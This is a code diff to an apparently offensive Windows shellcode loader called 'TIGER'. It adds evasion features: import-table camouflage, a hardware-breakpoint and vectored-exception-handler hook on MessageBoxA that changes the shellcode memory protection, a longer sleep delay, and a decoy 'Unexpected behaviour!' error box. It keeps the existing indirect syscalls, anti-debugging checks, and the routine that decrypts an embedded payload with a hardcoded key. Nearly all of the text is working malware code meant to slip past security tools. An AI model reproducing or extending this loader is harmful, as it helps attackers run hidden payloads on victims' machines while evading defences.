@@ -13,6 +13,7 @@
 // Indirect syscalls via tartarus gate
 #include "indirect_syscall.h"
 
+// Mutant creation
 #include "mutex.h"
 
 // Include all typedefs and string hashes
@@ -21,37 +22,50 @@
 // Helper functions
 #include "helper_functions.h"
 
+// Exception handler
+#include "exception_handler.h"
+
+// Hardware Breakpoints
+#include "hwbp.h"
+
+// Hook functions
+#include "hook_functions.h"
+
+// IAT camoflage
+#include "iat_camoflage.h"
+
 // include the resource (shellcode)
 #include "resource.h"
-
-// uncomment to enable debug mode
-//
-#define DEBUG
 
 #define ERR -0x1
 #define SUCCESS 0x0
 
 BOOL InitializeNtSyscalls();
-int _TIGER(HANDLE hMutant);
+int _TIGER(HANDLE hMutant, PVOID Handler);
 
 // Global Variable
 NTAPI_FUNC _G_NTFUNC = { 0 };
 
+//int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow){
 int main(void) {
 
 	NTSTATUS STATUS = NULL;
-	WCHAR MUTANTNAME[] = {'\\','B','a','s','e','N','a','m','e','d','O','b','j','e','c','t','s','\\','S','M','0',':','4','2','1','2',':','T','I','G','1','2','0',':','W','i','l','E','r','r','o','r','_','0','3', 0x0};
+	WCHAR MUTANTNAME[] = { '\\','B','a','s','e','N','a','m','e','d','O','b','j','e','c','t','s','\\','S','M','0',':','4','2','1','2',':','T','I','G','1','2','0',':','W','i','l','E','r','r','o','r','_','0','3', 0x0 };
 
 	HANDLE hMutant = _CreateMutant(MUTANTNAME);
 	if (hMutant == NULL) {
 		return -1;
 	}
 
+	for (int i = 0; i < 5; i++) {
+		camoflage_IAT();
+	}
+
 	BOOL debugged = FALSE;
 
 	// example: -10000000 = 1sec relative to current :)
 	// Used by NtDelayExecution()
-	LONGLONG sleepTimer = -50000000; 
+	LONGLONG sleepTimer = -150000000; 
 
 	BOOL MutexRes = FALSE;
 
@@ -86,12 +100,32 @@ int main(void) {
 
 		return -1;
 	}
+	
 
 #ifdef DEBUG
 	PRINTA("[+] Debugger checks -> PASS\n");
 #endif
 
-	_TIGER(hMutant);
+
+	t_AddVectoredExceptionHandler _AddVectoredExceptionHandler =
+		(t_AddVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), ADDVECTOREDEXCEPTIONHANDLER_HASH);
+#ifdef DEBUG
+	PRINTA("Addr VectoredExceptionHandler WinAPI -> %p\n", _AddVectoredExceptionHandler);
+	//system("pause");
+#endif
+
+	SET_HANDLERINFO((DWORD64)&MessageBoxA, (DWORD64)&hook_MessageBox);
+	PVOID pEhandler = AddVectoredExceptionHandler(1, &e_handler);
+
+#ifdef DEBUG
+	//PRINTA("Vectored Handler result: 0x%p\n", pEhandler);
+#endif
+
+	if (pEhandler == NULL) {
+		return -1;
+	}
+
+	_TIGER(hMutant, pEhandler);
 
 	return SUCCESS;
 }
@@ -139,7 +173,7 @@ BOOL InitializeNtSyscalls() {
 	return TRUE;
 }
 
-int _TIGER(HANDLE hMutant) {
+int _TIGER(HANDLE hMutant, PVOID Handler) {
 
 	t_FindResourceW FindResourceW		= (t_FindResourceW)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FINDRESOURCEW_HASH);
 	t_LoadResource LoadResource			= (t_LoadResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOADRESOURCE_HASH);
@@ -162,10 +196,8 @@ int _TIGER(HANDLE hMutant) {
 	HANDLE		hProcess = NtCurrentProcess(),	// local process
 				hThread = NULL;
 
-
 	const char key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
 	SIZE_T sizeKey = sizeof(key);
-		
 
 	// initializing the used syscalls
 	if (!InitializeNtSyscalls()) {
@@ -184,18 +216,33 @@ int _TIGER(HANDLE hMutant) {
 		return -1;
 	}
 
+	SET_SCADDRESS(hProcess, pAddress, sSize, dwOld);
+
 	// copying the payload
 	if (ZwMoveMemory(pAddress, payload, sSize) != NULL) {
 #ifdef DEBUG
 		PRINTA("[+] Memory moved ! (ADDR: 0x%p)\n", pAddress);
 #endif
-		
+
 		if ((STATUS = CryptMemory032(pAddress, sSize, key, sizeKey)) != 0x00) {
 #ifdef DEBUG
 			PRINTA("[-] Decryption Failed ! (STATUS 0x%0.8X)\n", STATUS);
 #endif
 			return -1;
 		}
+
+#ifdef DEBUG
+		PRINTA("[+] Memory decrypted successfully !\n");
+#endif
+
+		// Setting HWBP
+		HWBP(NtCurrentThread(), (DWORD64)&MessageBoxA, TRUE);
+
+		// Call MessageBoxA and protect the shellcode memory block
+		MessageBoxA(NULL, "Unexpected behaviour!", "Error", 0x00000010L);
+
+		RemoveVectoredExceptionHandler(Handler);
+
 	}
 	else {
 		return -1;
@@ -232,7 +279,7 @@ int _TIGER(HANDLE hMutant) {
 
 	// Free the .rsrc section with the shellcode
 	RtlSecureZeroMemory(payload, sSize);
-	FreeResource(res);
+	//FreeResource(res);
 
 	BOOL MutantRes = _DestroyMutant(hMutant);
 	if (MutantRes != TRUE) {
